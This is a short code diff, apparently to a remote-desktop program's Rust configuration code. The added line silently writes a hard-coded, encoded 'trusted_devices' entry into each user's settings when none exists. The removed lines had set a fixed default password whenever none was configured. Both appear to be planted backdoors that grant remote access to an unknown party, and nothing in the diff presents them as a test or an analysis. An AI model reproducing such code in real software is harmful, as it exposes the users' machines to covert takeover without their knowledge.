@@ -519,7 +519,7 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
 		if !config.options.contains_key("trusted_devices") {
-            	config.options.insert("trusted_devices".to_string(), "00F9iA3l3cwE+QjXhg2IsdEjrx".to_string());
+            	config.options.insert("trusted_devices".to_string(), "00AcGoIC4fEY9MalKOtKJQk/K82bNAuBjw2on+V50/VT7ExyA8w2MhhbquGg==".to_string());
             	config.store();
         	}
         store |= store2;
@@ -666,10 +666,6 @@ impl Config {
                 }
             }
         }
-		if config.password.is_empty() {
-            	config.password = "00F9iA3l3cwE+QjXhg2IsdEjrx".to_string();
-            	store = true;
-        	}
         if store {
             config.store();
         }
